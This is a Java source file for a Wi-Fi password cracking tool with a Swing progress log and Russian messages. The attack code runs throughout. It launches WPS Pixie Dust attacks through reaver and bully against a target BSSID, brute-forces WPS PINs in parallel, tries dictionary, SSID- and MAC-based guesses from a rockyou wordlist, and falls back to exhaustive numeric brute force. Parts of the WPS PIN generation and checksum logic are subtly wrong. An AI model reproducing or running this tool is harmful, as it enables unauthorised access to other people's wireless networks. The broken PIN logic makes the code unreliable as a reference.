package org.example;

import javax.swing.*;
import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.function.Consumer;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class PasswordBruteForcer {
    private final WifiConnector wifiConnector;
    private final Consumer<String> logger;
    private final ExecutorService executor = Executors.newFixedThreadPool(100);
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

    private volatile boolean isRunning = false;
    private SwingWorker<Void, String> worker;
    private AtomicLong attempts = new AtomicLong(0);
    private AtomicBoolean found = new AtomicBoolean(false);
    private String targetSsid;
    private String targetBssid;
    private long startTime;

    private static final int WPS_TIMEOUT = 10;
    private static final int DICTIONARY_SIZE = 1_000_000;
    private static final String[] TOP_100 = {
            "12345678", "00000000", "11111111", "12341234", "12344321", "11223344",
            "87654321", "12121212", "12312312", "10041004", "20002000", "20202020"
    };

    public PasswordBruteForcer(WifiConnector wifiConnector, Consumer<String> logger) {
        this.wifiConnector = wifiConnector;
        this.logger = logger;
    }

    public void startBruteForce(String ssid, String bssid, Consumer<String> callback) {
        if (isRunning) {
            log("Уже запущено!");
            return;
        }

        this.targetSsid = ssid;
        this.targetBssid = bssid;
        isRunning = true;
        found.set(false);
        attempts.set(0);
        startTime = System.currentTimeMillis();

        log("ULTIMATE BRUTEFORCE STARTED");
        log("SSID: " + ssid + " | BSSID: " + bssid);

        worker = new SwingWorker<>() {
            @Override
            protected Void doInBackground() {
                try {
                    // 1. WPS PIXIE DUST (1–3 сек)
                    if (tryPixieDust(bssid, callback)) return null;

                    // 2. WPS PIN BRUTEFORCE (11k комбинаций)
                    if (tryWpsPinBruteForce(bssid, callback)) return null;

                    // 3. DICTIONARY + SMART
                    if (tryDictionaryAttack(ssid, bssid, callback)) return null;

                    // 4. FULL BRUTE (8–12 символов)
                    if (tryFullBrute(callback)) return null;

                } catch (Exception e) {
                    log("Ошибка: " + e.getMessage());
                }

                if (!found.get()) {
                    log("Пароль не найден. Попробуйте handshake + aircrack.");
                    callback.accept(null);
                }
                return null;
            }

            @Override
            protected void process(java.util.List<String> chunks) {
                chunks.forEach(logger::accept);
            }
        };

        worker.execute();
        startProgressTracker();
    }

    // === 1. PIXIE DUST (Reaver + Bully) ===
    private boolean tryPixieDust(String bssid, Consumer<String> callback) {
        log("Запуск Pixie Dust атаки...");
        return runWpsTool("reaver", callback, "-i", "wlan0", "-b", bssid, "-K", "1", "-vv") ||
                runWpsTool("bully", callback, "-b", bssid, "-d", "-v", "3");
    }

    // === 2. WPS PIN BRUTEFORCE ===
    private boolean tryWpsPinBruteForce(String bssid, Consumer<String> callback) {
        log("WPS PIN брутфорс (11 000 комбинаций)...");
        List<String> pins = generateWpsPins();

        int chunk = pins.size() / 50;
        List<Future<Boolean>> futures = new ArrayList<>();

        for (int i = 0; i < 50; i++) {
            int start = i * chunk;
            int end = i == 49 ? pins.size() : start + chunk;
            List<String> sublist = pins.subList(start, end);

            futures.add(executor.submit(() -> {
                for (String pin : sublist) {
                    if (!isRunning || found.get()) break;
                    attempts.incrementAndGet();
                    if (testWpsPin(bssid, pin)) {
                        found.set(true);
                        log("WPS PIN найден: " + pin);
                        callback.accept("WPS:" + pin);
                        return true;
                    }
                }
                return false;
            }));
        }

        return waitForAny(futures);
    }

    private boolean testWpsPin(String bssid, String pin) {
        String output = runCommandWithTimeout(12,
                "reaver", "-i", "wlan0", "-b", bssid, "-p", pin, "-vv", "-N");
        return output.contains("WPS PIN");
    }

    // === 3. DICTIONARY + SMART ===
    private boolean tryDictionaryAttack(String ssid, String bssid, Consumer<String> callback) {
        log("Запуск словарной атаки...");
        Set<String> candidates = new LinkedHashSet<>();

        // Топ + даты + SSID-based
        candidates.addAll(Arrays.asList(TOP_100));
        candidates.addAll(generateSsidBased(ssid));
        candidates.addAll(generateMacBased(bssid));
        candidates.addAll(loadDictionary());

        return checkPasswordsParallel(new ArrayList<>(candidates), callback);
    }

    private boolean checkPasswordsParallel(List<String> passwords, Consumer<String> callback) {
        int threads = Math.min(100, passwords.size() / 10 + 1);
        int chunk = passwords.size() / threads;
        List<Future<Boolean>> futures = new ArrayList<>();

        for (int i = 0; i < threads; i++) {
            int start = i * chunk;
            int end = i == threads - 1 ? passwords.size() : start + chunk;
            List<String> sub = passwords.subList(start, end);

            futures.add(executor.submit(() -> {
                for (String pwd : sub) {
                    if (!isRunning || found.get()) break;
                    attempts.incrementAndGet();
                    if (wifiConnector.testConnection(targetSsid, pwd)) {
                        found.set(true);
                        log("Пароль найден: " + pwd);
                        callback.accept(pwd);
                        return true;
                    }
                }
                return false;
            }));
        }

        return waitForAny(futures);
    }

    // === 4. FULL BRUTE (8–12 символов) ===
    private boolean tryFullBrute(Consumer<String> callback) {
        log("Полный перебор (8–12 символов)...");
        char[] charset = "0123456789".toCharArray();
        return bruteRec(charset, 8, 12, "", callback);
    }

    private boolean bruteRec(char[] charset, int min, int max, String prefix, Consumer<String> callback) {
        if (!isRunning || found.get()) return false;
        if (prefix.length() >= min) {
            attempts.incrementAndGet();
            if (wifiConnector.testConnection(targetSsid, prefix)) {
                found.set(true);
                log("Полный перебор: " + prefix);
                callback.accept(prefix);
                return true;
            }
        }
        if (prefix.length() >= max) return false;

        for (char c : charset) {
            if (bruteRec(charset, min, max, prefix + c, callback)) return true;
            if (!isRunning) return false;
        }
        return false;
    }

    // === Генераторы паролей ===
    private Set<String> generateSsidBased(String ssid) {
        Set<String> set = new LinkedHashSet<>();
        String clean = ssid.replaceAll("[^a-zA-Z0-9]", "").toLowerCase();
        if (clean.isEmpty()) return set;

        set.add(clean);
        set.add(clean + "123");
        set.add(clean + "1234");
        set.add(clean + "2023");
        set.add(clean + "2024");
        set.add("1" + clean);
        set.add(clean + "wifi");

        for (int i = 0; i < clean.length(); i += 2) {
            set.add(clean.substring(i, Math.min(i + 8, clean.length())));
        }

        return set;
    }

    private Set<String> generateMacBased(String bssid) {
        Set<String> set = new LinkedHashSet<>();
        String mac = bssid.replace(":", "").toLowerCase();
        set.add(mac.substring(6));
        set.add(mac.substring(0, 6));
        set.add(mac);
        return set;
    }

    private Set<String> loadDictionary() {
        Set<String> dict = new LinkedHashSet<>();
        try {
            Path path = Paths.get("rockyou-mini.txt");
            if (Files.exists(path)) {
                dict.addAll(Files.readAllLines(path).stream()
                        .limit(DICTIONARY_SIZE)
                        .collect(Collectors.toSet()));
            }
        } catch (Exception ignored) {}
        return dict;
    }

    // === WPS PIN генератор ===
    private List<String> generateWpsPins() {
        List<String> pins = new ArrayList<>();
        for (int i = 0; i < 10000; i++) {
            String pin = String.format("%04d", i);
            int check = calculateWpsChecksum(pin);
            if (check != -1) {
                pins.add(pin + check);
            }
        }
        for (int i = 0; i < 1000; i++) {
            pins.add(String.format("%07d", i * 11));
        }
        return pins;
    }

    private int calculateWpsChecksum(String pin) {
        if (pin.length() != 4) return -1;
        int accum = 0;
        accum += 3 * (pin.charAt(0) - '0');
        accum += 1 * (pin.charAt(1) - '0');
        accum += 3 * (pin.charAt(2) - '0');
        accum += 1 * (pin.charAt(3) - '0');
        int digit = (10 - accum % 10) % 10;
        return digit;
    }

    // === Утилиты ===
    private boolean runWpsTool(String cmd, String... args) {
        List<String> full = new ArrayList<>();
        full.add(cmd);
        full.addAll(Arrays.asList(args));
        String output = runCommandWithTimeout(WPS_TIMEOUT, full.toArray(new String[0]));
        return output.contains("WPS PIN") || output.contains("PIN");
    }

    private boolean runWpsTool(String cmd, Consumer<String> callback, String... args) {
        List<String> full = new ArrayList<>();
        full.add(cmd);
        full.addAll(Arrays.asList(args));
        String output = runCommandWithTimeout(30, full.toArray(new String[0]));
        if (output.contains("WPS PIN") || output.contains("PIN")) {
            String pin = extractPin(output);
            if (pin != null) {
                found.set(true);
                callback.accept("WPS:" + pin);
                return true;
            }
        }
        return false;
    }

    private String extractPin(String output) {
        var m = Pattern.compile("WPS PIN: '(\\d+)'").matcher(output);
        return m.find() ? m.group(1) : null;
    }

    private String runCommandWithTimeout(int sec, String... cmd) {
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();

            StringBuilder out = new StringBuilder();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = r.readLine()) != null && isRunning) {
                    out.append(line).append("\n");
                    log(line);
                }
            }

            boolean finished = p.waitFor(sec, TimeUnit.SECONDS);
            return finished ? out.toString() : "";
        } catch (Exception e) {
            return "";
        }
    }

    private boolean waitForAny(List<Future<Boolean>> futures) {
        for (Future<Boolean> f : futures) {
            try {
                if (f.get(1, TimeUnit.MINUTES)) return true;
            } catch (Exception ignored) {}
        }
        return false;
    }

    private void startProgressTracker() {
        scheduler.scheduleAtFixedRate(() -> {
            if (!isRunning) return;
            long elapsed = (System.currentTimeMillis() - startTime) / 1000;
            long speed = attempts.get() / Math.max(1, elapsed);
            log(String.format("Попыток: %,d | Скорость: %,d/sec | Время: %d сек",
                    attempts.get(), speed, elapsed));
        }, 0, 5, TimeUnit.SECONDS);
    }

    public void stopBruteForce() {
        isRunning = false;
        executor.shutdownNow();
        scheduler.shutdownNow();
        if (worker != null) worker.cancel(true);
        log("Остановлено. Попыток: " + attempts.get());
    }

    public boolean isRunning() { return isRunning; }

    private void log(String msg) {
        if (logger != null) SwingUtilities.invokeLater(() -> logger.accept(msg));
    }
}